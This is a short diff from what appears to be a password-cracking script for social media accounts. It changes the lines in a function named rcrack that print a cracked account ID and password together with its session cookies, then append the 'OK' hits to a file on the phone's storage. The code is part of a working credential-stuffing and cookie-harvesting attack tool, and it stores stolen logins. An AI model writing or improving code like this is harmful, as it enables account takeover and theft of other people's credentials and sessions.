@@ -1084,9 +1084,9 @@ def rcrack(ids,passlist):
 					if 'checkpoint' in str(lo):
 						print('\r\r\033[1;34m [GS XD-2F] '+ids+' | '+pas)
 					else:
-						print(f'\r\x1b[1;32m [GS XD-OK] '+ids+' | '+pas)
+						print('\033[38;5;46m〔᚛GS XD-OK〔᚛᚜〕 ' +uid+ '|' +ps+    '  \n   \033〔᚛1;33mCOOKIES〔᚛💉᚜〕 : \033[38;5;46m'+coki+ ' ') 
 						cek_apk(session,coki)
-						open('/sdcard/GS XD-OK.txt', 'a').write(ids+'|'+pas+'\n')
+						open('/sdcard/GS XD-OK.txt', 'a').write( uid+' | '+ps+'\n')
 						oks.append(uid)
 						break
 			elif 'checkpoint' in log_cookies:
